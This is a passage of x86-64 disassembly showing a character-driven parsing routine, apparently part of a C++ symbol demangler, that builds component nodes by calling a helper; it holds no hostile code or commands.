   2dc494870:	48 89 cb             	mov    %rcx,%rbx
   2dc494873:	4c 89 c1             	mov    %r8,%rcx
   2dc494876:	e8 65 f6 ff ff       	call   0x2dc493ee0
   2dc49487b:	85 c0                	test   %eax,%eax
   2dc49487d:	75 39                	jne    0x2dc4948b8
   2dc49487f:	41 0f be 00          	movsbl (%r8),%eax
   2dc494883:	3c 54                	cmp    $0x54,%al
   2dc494885:	0f 8f d5 00 00 00    	jg     0x2dc494960
   2dc49488b:	3c 40                	cmp    $0x40,%al
   2dc49488d:	0f 8e 6d 01 00 00    	jle    0x2dc494a00
   2dc494893:	83 e8 41             	sub    $0x41,%eax
   2dc494896:	3c 13                	cmp    $0x13,%al
   2dc494898:	0f 87 62 01 00 00    	ja     0x2dc494a00
   2dc49489e:	48 8d 15 83 3d 02 00 	lea    0x23d83(%rip),%rdx        # 0x2dc4b8628
   2dc4948a5:	0f b6 c0             	movzbl %al,%eax
   2dc4948a8:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   2dc4948ac:	48 01 d0             	add    %rdx,%rax
   2dc4948af:	ff e0                	jmp    *%rax
   2dc4948b1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4948b8:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   2dc4948bd:	45 31 c0             	xor    %r8d,%r8d
   2dc4948c0:	48 89 d9             	mov    %rbx,%rcx
   2dc4948c3:	e8 98 1d 00 00       	call   0x2dc496660
   2dc4948c8:	48 89 c6             	mov    %rax,%rsi
   2dc4948cb:	48 85 c0             	test   %rax,%rax
   2dc4948ce:	0f 84 94 03 00 00    	je     0x2dc494c68
   2dc4948d4:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc4948d8:	48 89 d9             	mov    %rbx,%rcx
   2dc4948db:	80 38 46             	cmpb   $0x46,(%rax)
   2dc4948de:	74 70                	je     0x2dc494950
   2dc4948e0:	e8 7b ff ff ff       	call   0x2dc494860
   2dc4948e5:	48 89 06             	mov    %rax,(%rsi)
   2dc4948e8:	48 85 c0             	test   %rax,%rax
   2dc4948eb:	0f 84 77 03 00 00    	je     0x2dc494c68
   2dc4948f1:	8b 38                	mov    (%rax),%edi
   2dc4948f3:	8d 57 e1             	lea    -0x1f(%rdi),%edx
   2dc4948f6:	83 fa 01             	cmp    $0x1,%edx
   2dc4948f9:	77 18                	ja     0x2dc494913
   2dc4948fb:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   2dc494900:	48 8b 50 10          	mov    0x10(%rax),%rdx
   2dc494904:	48 89 48 10          	mov    %rcx,0x10(%rax)
   2dc494908:	48 8b 06             	mov    (%rsi),%rax
   2dc49490b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494910:	48 89 16             	mov    %rdx,(%rsi)
   2dc494913:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   2dc494918:	48 85 d2             	test   %rdx,%rdx
   2dc49491b:	0f 84 47 03 00 00    	je     0x2dc494c68
   2dc494921:	8b 43 38             	mov    0x38(%rbx),%eax
   2dc494924:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   2dc494927:	0f 8d 3b 03 00 00    	jge    0x2dc494c68
   2dc49492d:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   2dc494931:	4c 63 c0             	movslq %eax,%r8
   2dc494934:	83 c0 01             	add    $0x1,%eax
   2dc494937:	4a 89 14 c1          	mov    %rdx,(%rcx,%r8,8)
   2dc49493b:	89 43 38             	mov    %eax,0x38(%rbx)
   2dc49493e:	48 89 d0             	mov    %rdx,%rax
   2dc494941:	48 83 c4 48          	add    $0x48,%rsp
   2dc494945:	5b                   	pop    %rbx
   2dc494946:	5e                   	pop    %rsi
   2dc494947:	5f                   	pop    %rdi
   2dc494948:	5d                   	pop    %rbp
   2dc494949:	41 5c                	pop    %r12
   2dc49494b:	41 5d                	pop    %r13
   2dc49494d:	c3                   	ret
   2dc49494e:	66 90                	xchg   %ax,%ax
   2dc494950:	e8 1b 0b 00 00       	call   0x2dc495470
   2dc494955:	eb 8e                	jmp    0x2dc4948e5
   2dc494957:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc49495e:	00 00 
   2dc494960:	8d 48 ab             	lea    -0x55(%rax),%ecx
   2dc494963:	80 f9 25             	cmp    $0x25,%cl
   2dc494966:	0f 87 94 00 00 00    	ja     0x2dc494a00
   2dc49496c:	49 b9 00 f0 bf c7 3e 	movabs $0x3ec7bff000,%r9
   2dc494973:	00 00 00 
   2dc494976:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc49497b:	48 d3 e2             	shl    %cl,%rdx
   2dc49497e:	4c 85 ca             	test   %r9,%rdx
   2dc494981:	0f 85 f1 07 00 00    	jne    0x2dc495178
   2dc494987:	83 e2 01             	and    $0x1,%edx
   2dc49498a:	0f 85 98 07 00 00    	jne    0x2dc495128
   2dc494990:	80 f9 20             	cmp    $0x20,%cl
   2dc494993:	75 6b                	jne    0x2dc494a00
   2dc494995:	49 83 c0 01          	add    $0x1,%r8
   2dc494999:	48 89 d9             	mov    %rbx,%rcx
   2dc49499c:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc4949a0:	e8 db fa ff ff       	call   0x2dc494480
   2dc4949a5:	45 31 c9             	xor    %r9d,%r9d
   2dc4949a8:	ba 28 00 00 00       	mov    $0x28,%edx
   2dc4949ad:	48 89 d9             	mov    %rbx,%rcx
   2dc4949b0:	49 89 c0             	mov    %rax,%r8
   2dc4949b3:	e8 d8 ee ff ff       	call   0x2dc493890
   2dc4949b8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc4949bd:	48 89 c6             	mov    %rax,%rsi
   2dc4949c0:	48 85 f6             	test   %rsi,%rsi
   2dc4949c3:	0f 84 9f 02 00 00    	je     0x2dc494c68
   2dc4949c9:	8b 43 38             	mov    0x38(%rbx),%eax
   2dc4949cc:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   2dc4949cf:	0f 8d 93 02 00 00    	jge    0x2dc494c68
   2dc4949d5:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   2dc4949d9:	48 63 c8             	movslq %eax,%rcx
   2dc4949dc:	83 c0 01             	add    $0x1,%eax
   2dc4949df:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   2dc4949e3:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   2dc4949e8:	89 43 38             	mov    %eax,0x38(%rbx)
   2dc4949eb:	48 89 d0             	mov    %rdx,%rax
   2dc4949ee:	48 83 c4 48          	add    $0x48,%rsp
   2dc4949f2:	5b                   	pop    %rbx
   2dc4949f3:	5e                   	pop    %rsi
   2dc4949f4:	5f                   	pop    %rdi
   2dc4949f5:	5d                   	pop    %rbp
   2dc4949f6:	41 5c                	pop    %r12
   2dc4949f8:	41 5d                	pop    %r13
   2dc4949fa:	c3                   	ret
   2dc4949fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc494a00:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc494a05:	48 89 d9             	mov    %rbx,%rcx
   2dc494a08:	48 83 c4 48          	add    $0x48,%rsp
   2dc494a0c:	5b                   	pop    %rbx
   2dc494a0d:	5e                   	pop    %rsi
   2dc494a0e:	5f                   	pop    %rdi
   2dc494a0f:	5d                   	pop    %rbp
   2dc494a10:	41 5c                	pop    %r12
   2dc494a12:	41 5d                	pop    %r13
   2dc494a14:	e9 77 1e 00 00       	jmp    0x2dc496890
   2dc494a19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc494a20:	49 83 c0 01          	add    $0x1,%r8
   2dc494a24:	48 89 d9             	mov    %rbx,%rcx
   2dc494a27:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494a2b:	e8 30 fe ff ff       	call   0x2dc494860
   2dc494a30:	45 31 c9             	xor    %r9d,%r9d
   2dc494a33:	ba 25 00 00 00       	mov    $0x25,%edx
   2dc494a38:	48 89 d9             	mov    %rbx,%rcx
   2dc494a3b:	49 89 c0             	mov    %rax,%r8
   2dc494a3e:	e8 4d ee ff ff       	call   0x2dc493890
   2dc494a43:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494a48:	48 89 c6             	mov    %rax,%rsi
   2dc494a4b:	e9 70 ff ff ff       	jmp    0x2dc4949c0
   2dc494a50:	49 8d 40 01          	lea    0x1(%r8),%rax
   2dc494a54:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc494a58:	41 80 78 01 00       	cmpb   $0x0,0x1(%r8)
   2dc494a5d:	0f 84 05 02 00 00    	je     0x2dc494c68
   2dc494a63:	49 8d 40 02          	lea    0x2(%r8),%rax
   2dc494a67:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc494a6b:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   2dc494a70:	83 e8 46             	sub    $0x46,%eax
   2dc494a73:	3c 30                	cmp    $0x30,%al
   2dc494a75:	0f 87 ed 01 00 00    	ja     0x2dc494c68
   2dc494a7b:	48 8d 15 f6 3b 02 00 	lea    0x23bf6(%rip),%rdx        # 0x2dc4b8678
   2dc494a82:	0f b6 c0             	movzbl %al,%eax
   2dc494a85:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   2dc494a89:	48 01 d0             	add    %rdx,%rax
   2dc494a8c:	ff e0                	jmp    *%rax
   2dc494a8e:	66 90                	xchg   %ax,%ax
   2dc494a90:	48 89 d9             	mov    %rbx,%rcx
   2dc494a93:	e8 d8 09 00 00       	call   0x2dc495470
   2dc494a98:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494a9d:	48 89 c6             	mov    %rax,%rsi
   2dc494aa0:	e9 1b ff ff ff       	jmp    0x2dc4949c0
   2dc494aa5:	0f 1f 00             	nopl   (%rax)
   2dc494aa8:	49 83 c0 01          	add    $0x1,%r8
   2dc494aac:	48 89 d9             	mov    %rbx,%rcx
   2dc494aaf:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494ab3:	e8 a8 fd ff ff       	call   0x2dc494860
   2dc494ab8:	45 31 c9             	xor    %r9d,%r9d
   2dc494abb:	ba 26 00 00 00       	mov    $0x26,%edx
   2dc494ac0:	48 89 d9             	mov    %rbx,%rcx
   2dc494ac3:	49 89 c0             	mov    %rax,%r8
   2dc494ac6:	e8 c5 ed ff ff       	call   0x2dc493890
   2dc494acb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494ad0:	48 89 c6             	mov    %rax,%rsi
   2dc494ad3:	e9 e8 fe ff ff       	jmp    0x2dc4949c0
   2dc494ad8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc494adf:	00 
   2dc494ae0:	49 83 c0 01          	add    $0x1,%r8
   2dc494ae4:	48 89 d9             	mov    %rbx,%rcx
   2dc494ae7:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494aeb:	e8 70 fd ff ff       	call   0x2dc494860
   2dc494af0:	45 31 c9             	xor    %r9d,%r9d
   2dc494af3:	ba 24 00 00 00       	mov    $0x24,%edx
   2dc494af8:	48 89 d9             	mov    %rbx,%rcx
   2dc494afb:	49 89 c0             	mov    %rax,%r8
   2dc494afe:	e8 8d ed ff ff       	call   0x2dc493890
   2dc494b03:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494b08:	48 89 c6             	mov    %rax,%rsi
   2dc494b0b:	e9 b0 fe ff ff       	jmp    0x2dc4949c0
   2dc494b10:	49 83 c0 01          	add    $0x1,%r8
   2dc494b14:	48 89 d9             	mov    %rbx,%rcx
   2dc494b17:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494b1b:	e8 40 fd ff ff       	call   0x2dc494860
   2dc494b20:	45 31 c9             	xor    %r9d,%r9d
   2dc494b23:	ba 22 00 00 00       	mov    $0x22,%edx
   2dc494b28:	48 89 d9             	mov    %rbx,%rcx
   2dc494b2b:	49 89 c0             	mov    %rax,%r8
   2dc494b2e:	e8 5d ed ff ff       	call   0x2dc493890
   2dc494b33:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494b38:	48 89 c6             	mov    %rax,%rsi
   2dc494b3b:	e9 80 fe ff ff       	jmp    0x2dc4949c0
   2dc494b40:	49 83 c0 01          	add    $0x1,%r8
   2dc494b44:	48 89 d9             	mov    %rbx,%rcx
   2dc494b47:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494b4b:	e8 10 fd ff ff       	call   0x2dc494860
   2dc494b50:	45 31 c9             	xor    %r9d,%r9d
   2dc494b53:	ba 23 00 00 00       	mov    $0x23,%edx
   2dc494b58:	48 89 d9             	mov    %rbx,%rcx
   2dc494b5b:	49 89 c0             	mov    %rax,%r8
   2dc494b5e:	e8 2d ed ff ff       	call   0x2dc493890
   2dc494b63:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494b68:	48 89 c6             	mov    %rax,%rsi
   2dc494b6b:	e9 50 fe ff ff       	jmp    0x2dc4949c0
   2dc494b70:	48 89 d9             	mov    %rbx,%rcx
   2dc494b73:	e8 38 f6 ff ff       	call   0x2dc4941b0
   2dc494b78:	48 8b 7b 18          	mov    0x18(%rbx),%rdi
   2dc494b7c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494b81:	48 89 c6             	mov    %rax,%rsi
   2dc494b84:	80 3f 49             	cmpb   $0x49,(%rdi)
   2dc494b87:	0f 85 33 fe ff ff    	jne    0x2dc4949c0
   2dc494b8d:	44 8b 4b 50          	mov    0x50(%rbx),%r9d
   2dc494b91:	45 85 c9             	test   %r9d,%r9d
   2dc494b94:	0f 85 8c 06 00 00    	jne    0x2dc495226
   2dc494b9a:	48 85 c0             	test   %rax,%rax
   2dc494b9d:	0f 84 c5 00 00 00    	je     0x2dc494c68
   2dc494ba3:	8b 43 38             	mov    0x38(%rbx),%eax
   2dc494ba6:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   2dc494ba9:	0f 8d b9 00 00 00    	jge    0x2dc494c68
   2dc494baf:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   2dc494bb3:	48 63 c8             	movslq %eax,%rcx
   2dc494bb6:	83 c0 01             	add    $0x1,%eax
   2dc494bb9:	45 31 c9             	xor    %r9d,%r9d
   2dc494bbc:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   2dc494bc0:	89 43 38             	mov    %eax,0x38(%rbx)
   2dc494bc3:	0f b6 07             	movzbl (%rdi),%eax
   2dc494bc6:	8d 50 b7             	lea    -0x49(%rax),%edx
   2dc494bc9:	80 fa 01             	cmp    $0x1,%dl
   2dc494bcc:	77 13                	ja     0x2dc494be1
   2dc494bce:	48 83 c7 01          	add    $0x1,%rdi
   2dc494bd2:	48 89 d9             	mov    %rbx,%rcx
   2dc494bd5:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   2dc494bd9:	e8 52 2b 00 00       	call   0x2dc497730
   2dc494bde:	49 89 c1             	mov    %rax,%r9
   2dc494be1:	49 89 f0             	mov    %rsi,%r8
   2dc494be4:	ba 04 00 00 00       	mov    $0x4,%edx
   2dc494be9:	48 89 d9             	mov    %rbx,%rcx
   2dc494bec:	e8 9f ec ff ff       	call   0x2dc493890
   2dc494bf1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494bf6:	48 89 c6             	mov    %rax,%rsi
   2dc494bf9:	e9 c2 fd ff ff       	jmp    0x2dc4949c0
   2dc494bfe:	66 90                	xchg   %ax,%ax
   2dc494c00:	49 8d 50 01          	lea    0x1(%r8),%rdx
   2dc494c04:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc494c08:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   2dc494c0d:	3c 5f                	cmp    $0x5f,%al
   2dc494c0f:	0f 84 a3 00 00 00    	je     0x2dc494cb8
   2dc494c15:	83 e8 30             	sub    $0x30,%eax
   2dc494c18:	3c 09                	cmp    $0x9,%al
   2dc494c1a:	0f 87 d8 05 00 00    	ja     0x2dc4951f8
   2dc494c20:	49 89 d2             	mov    %rdx,%r10
   2dc494c23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc494c28:	4d 89 d3             	mov    %r10,%r11
   2dc494c2b:	49 83 c2 01          	add    $0x1,%r10
   2dc494c2f:	4c 89 53 18          	mov    %r10,0x18(%rbx)
   2dc494c33:	41 0f b6 02          	movzbl (%r10),%eax
   2dc494c37:	83 e8 30             	sub    $0x30,%eax
   2dc494c3a:	3c 09                	cmp    $0x9,%al
   2dc494c3c:	76 ea                	jbe    0x2dc494c28
   2dc494c3e:	44 89 d8             	mov    %r11d,%eax
   2dc494c41:	48 89 d9             	mov    %rbx,%rcx
   2dc494c44:	44 29 c0             	sub    %r8d,%eax
   2dc494c47:	41 89 c0             	mov    %eax,%r8d
   2dc494c4a:	e8 51 ed ff ff       	call   0x2dc4939a0
   2dc494c4f:	48 89 c6             	mov    %rax,%rsi
   2dc494c52:	48 85 c0             	test   %rax,%rax
   2dc494c55:	74 11                	je     0x2dc494c68
   2dc494c57:	41 0f b6 43 01       	movzbl 0x1(%r11),%eax
   2dc494c5c:	4c 89 d2             	mov    %r10,%rdx
   2dc494c5f:	3c 5f                	cmp    $0x5f,%al
   2dc494c61:	74 57                	je     0x2dc494cba
   2dc494c63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc494c68:	31 d2                	xor    %edx,%edx
   2dc494c6a:	e9 cf fc ff ff       	jmp    0x2dc49493e
   2dc494c6f:	90                   	nop
   2dc494c70:	49 83 c0 01          	add    $0x1,%r8
   2dc494c74:	48 89 d9             	mov    %rbx,%rcx
   2dc494c77:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   2dc494c7b:	e8 e0 fb ff ff       	call   0x2dc494860
   2dc494c80:	48 89 c6             	mov    %rax,%rsi
   2dc494c83:	48 85 c0             	test   %rax,%rax
   2dc494c86:	74 e0                	je     0x2dc494c68
   2dc494c88:	48 89 d9             	mov    %rbx,%rcx
   2dc494c8b:	e8 d0 fb ff ff       	call   0x2dc494860
   2dc494c90:	49 89 c1             	mov    %rax,%r9
   2dc494c93:	48 85 c0             	test   %rax,%rax
   2dc494c96:	74 d0                	je     0x2dc494c68
   2dc494c98:	49 89 f0             	mov    %rsi,%r8
   2dc494c9b:	ba 2b 00 00 00       	mov    $0x2b,%edx
   2dc494ca0:	48 89 d9             	mov    %rbx,%rcx
   2dc494ca3:	e8 e8 eb ff ff       	call   0x2dc493890
   2dc494ca8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494cad:	48 89 c6             	mov    %rax,%rsi
   2dc494cb0:	e9 0b fd ff ff       	jmp    0x2dc4949c0
   2dc494cb5:	0f 1f 00             	nopl   (%rax)
   2dc494cb8:	31 f6                	xor    %esi,%esi
   2dc494cba:	48 83 c2 01          	add    $0x1,%rdx
   2dc494cbe:	48 89 d9             	mov    %rbx,%rcx
   2dc494cc1:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc494cc5:	e8 96 fb ff ff       	call   0x2dc494860
   2dc494cca:	49 89 f0             	mov    %rsi,%r8
   2dc494ccd:	ba 2a 00 00 00       	mov    $0x2a,%edx
   2dc494cd2:	48 89 d9             	mov    %rbx,%rcx
   2dc494cd5:	49 89 c1             	mov    %rax,%r9
   2dc494cd8:	e8 b3 eb ff ff       	call   0x2dc493890
   2dc494cdd:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494ce2:	48 89 c6             	mov    %rax,%rsi
   2dc494ce5:	e9 d6 fc ff ff       	jmp    0x2dc4949c0
   2dc494cea:	8b 73 4c             	mov    0x4c(%rbx),%esi
   2dc494ced:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   2dc494cf4:	48 89 d9             	mov    %rbx,%rcx
   2dc494cf7:	e8 f4 10 00 00       	call   0x2dc495df0
   2dc494cfc:	89 73 4c             	mov    %esi,0x4c(%rbx)
   2dc494cff:	45 31 c9             	xor    %r9d,%r9d
   2dc494d02:	ba 44 00 00 00       	mov    $0x44,%edx
   2dc494d07:	49 89 c0             	mov    %rax,%r8
   2dc494d0a:	48 89 d9             	mov    %rbx,%rcx
   2dc494d0d:	e8 7e eb ff ff       	call   0x2dc493890
   2dc494d12:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494d17:	48 89 c6             	mov    %rax,%rsi
   2dc494d1a:	48 85 c0             	test   %rax,%rax
   2dc494d1d:	0f 84 45 ff ff ff    	je     0x2dc494c68
   2dc494d23:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc494d27:	80 38 00             	cmpb   $0x0,(%rax)
   2dc494d2a:	0f 84 38 ff ff ff    	je     0x2dc494c68
   2dc494d30:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc494d34:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc494d38:	80 38 45             	cmpb   $0x45,(%rax)
   2dc494d3b:	0f 84 88 fc ff ff    	je     0x2dc4949c9
   2dc494d41:	31 d2                	xor    %edx,%edx
   2dc494d43:	e9 f6 fb ff ff       	jmp    0x2dc49493e
   2dc494d48:	41 80 78 02 5f       	cmpb   $0x5f,0x2(%r8)
   2dc494d4d:	0f 84 8c 05 00 00    	je     0x2dc4952df
   2dc494d53:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494d56:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494d59:	0f 8d 09 ff ff ff    	jge    0x2dc494c68
   2dc494d5f:	48 63 f0             	movslq %eax,%rsi
   2dc494d62:	83 c0 01             	add    $0x1,%eax
   2dc494d65:	48 89 d9             	mov    %rbx,%rcx
   2dc494d68:	48 c1 e6 05          	shl    $0x5,%rsi
   2dc494d6c:	48 03 73 20          	add    0x20(%rbx),%rsi
   2dc494d70:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   2dc494d77:	00 
   2dc494d78:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494d7b:	c7 06 43 00 00 00    	movl   $0x43,(%rsi)
   2dc494d81:	e8 7a ec ff ff       	call   0x2dc493a00
   2dc494d86:	89 46 10             	mov    %eax,0x10(%rsi)
   2dc494d89:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc494d8d:	80 38 5f             	cmpb   $0x5f,(%rax)
   2dc494d90:	0f 85 d2 fe ff ff    	jne    0x2dc494c68
   2dc494d96:	48 83 c0 01          	add    $0x1,%rax
   2dc494d9a:	48 89 d9             	mov    %rbx,%rcx
   2dc494d9d:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc494da1:	e8 ba fa ff ff       	call   0x2dc494860
   2dc494da6:	49 89 f0             	mov    %rsi,%r8
   2dc494da9:	ba 2d 00 00 00       	mov    $0x2d,%edx
   2dc494dae:	48 89 d9             	mov    %rbx,%rcx
   2dc494db1:	49 89 c1             	mov    %rax,%r9
   2dc494db4:	e8 d7 ea ff ff       	call   0x2dc493890
   2dc494db9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   2dc494dbe:	48 89 c6             	mov    %rax,%rsi
   2dc494dc1:	e9 fa fb ff ff       	jmp    0x2dc4949c0
   2dc494dc6:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494dc9:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494dcc:	0f 8d 03 1c 02 00    	jge    0x2dc4b69d5
   2dc494dd2:	48 63 d0             	movslq %eax,%rdx
   2dc494dd5:	83 c0 01             	add    $0x1,%eax
   2dc494dd8:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494ddc:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494de0:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494de7:	00 
   2dc494de8:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494deb:	48 8d 05 6e 51 02 00 	lea    0x2516e(%rip),%rax        # 0x2dc4b9f60
   2dc494df2:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494df8:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494dfc:	83 43 48 07          	addl   $0x7,0x48(%rbx)
   2dc494e00:	e9 39 fb ff ff       	jmp    0x2dc49493e
   2dc494e05:	48 89 d9             	mov    %rbx,%rcx
   2dc494e08:	e8 f3 eb ff ff       	call   0x2dc493a00
   2dc494e0d:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc494e11:	41 89 c0             	mov    %eax,%r8d
   2dc494e14:	0f b6 3a             	movzbl (%rdx),%edi
   2dc494e17:	40 80 ff 62          	cmp    $0x62,%dil
   2dc494e1b:	0f 84 68 04 00 00    	je     0x2dc495289
   2dc494e21:	40 80 ff 78          	cmp    $0x78,%dil
   2dc494e25:	74 0c                	je     0x2dc494e33
   2dc494e27:	40 80 ff 5f          	cmp    $0x5f,%dil
   2dc494e2b:	0f 85 37 fe ff ff    	jne    0x2dc494c68
   2dc494e31:	31 ff                	xor    %edi,%edi
   2dc494e33:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494e36:	48 83 c2 01          	add    $0x1,%rdx
   2dc494e3a:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494e3d:	0f 8d 7d 1b 02 00    	jge    0x2dc4b69c0
   2dc494e43:	48 63 f0             	movslq %eax,%rsi
   2dc494e46:	31 c9                	xor    %ecx,%ecx
   2dc494e48:	48 8d 6c 24 34       	lea    0x34(%rsp),%rbp
   2dc494e4d:	83 c0 01             	add    $0x1,%eax
   2dc494e50:	48 c1 e6 05          	shl    $0x5,%rsi
   2dc494e54:	48 03 73 20          	add    0x20(%rbx),%rsi
   2dc494e58:	48 89 4e 04          	mov    %rcx,0x4(%rsi)
   2dc494e5c:	48 89 e9             	mov    %rbp,%rcx
   2dc494e5f:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494e62:	48 8d 05 77 51 02 00 	lea    0x25177(%rip),%rax        # 0x2dc4b9fe0
   2dc494e69:	66 44 89 46 18       	mov    %r8w,0x18(%rsi)
   2dc494e6e:	c7 06 5c 00 00 00    	movl   $0x5c,(%rsi)
   2dc494e74:	48 89 46 10          	mov    %rax,0x10(%rsi)
   2dc494e78:	40 88 7e 1a          	mov    %dil,0x1a(%rsi)
   2dc494e7c:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   2dc494e80:	48 8d 15 69 37 02 00 	lea    0x23769(%rip),%rdx        # 0x2dc4b85f0
   2dc494e87:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   2dc494e8c:	e8 5f fb 00 00       	call   0x2dc4a49f0
   2dc494e91:	48 89 e9             	mov    %rbp,%rcx
   2dc494e94:	e8 47 fe 00 00       	call   0x2dc4a4ce0
   2dc494e99:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   2dc494e9d:	48 89 c2             	mov    %rax,%rdx
   2dc494ea0:	8b 43 48             	mov    0x48(%rbx),%eax
   2dc494ea3:	03 41 08             	add    0x8(%rcx),%eax
   2dc494ea6:	40 80 ff 01          	cmp    $0x1,%dil
   2dc494eaa:	83 d8 ff             	sbb    $0xffffffff,%eax
   2dc494ead:	01 d0                	add    %edx,%eax
   2dc494eaf:	89 43 48             	mov    %eax,0x48(%rbx)
   2dc494eb2:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   2dc494eb7:	e9 82 fa ff ff       	jmp    0x2dc49493e
   2dc494ebc:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494ebf:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494ec2:	0f 8d 0d 1b 02 00    	jge    0x2dc4b69d5
   2dc494ec8:	48 63 d0             	movslq %eax,%rdx
   2dc494ecb:	83 c0 01             	add    $0x1,%eax
   2dc494ece:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494ed2:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494ed6:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494edd:	00 
   2dc494ede:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494ee1:	48 8d 05 98 50 02 00 	lea    0x25098(%rip),%rax        # 0x2dc4b9f80
   2dc494ee8:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494eee:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494ef2:	83 43 48 08          	addl   $0x8,0x48(%rbx)
   2dc494ef6:	e9 43 fa ff ff       	jmp    0x2dc49493e
   2dc494efb:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494efe:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494f01:	0f 8d ce 1a 02 00    	jge    0x2dc4b69d5
   2dc494f07:	48 63 d0             	movslq %eax,%rdx
   2dc494f0a:	83 c0 01             	add    $0x1,%eax
   2dc494f0d:	48 c1 e2 05          	shl    $0x5,%rdx
   2dc494f11:	48 03 53 20          	add    0x20(%rbx),%rdx
   2dc494f15:	48 c7 42 04 00 00 00 	movq   $0x0,0x4(%rdx)
   2dc494f1c:	00 
   2dc494f1d:	89 43 28             	mov    %eax,0x28(%rbx)
   2dc494f20:	48 8d 05 19 50 02 00 	lea    0x25019(%rip),%rax        # 0x2dc4b9f40
   2dc494f27:	c7 02 27 00 00 00    	movl   $0x27,(%rdx)
   2dc494f2d:	48 89 42 10          	mov    %rax,0x10(%rdx)
   2dc494f31:	83 43 48 04          	addl   $0x4,0x48(%rbx)
   2dc494f35:	e9 04 fa ff ff       	jmp    0x2dc49493e
   2dc494f3a:	8b 43 28             	mov    0x28(%rbx),%eax
   2dc494f3d:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   2dc494f40:	0f 8d 8f 1a 02 00    	jge    0x2dc4b69d5
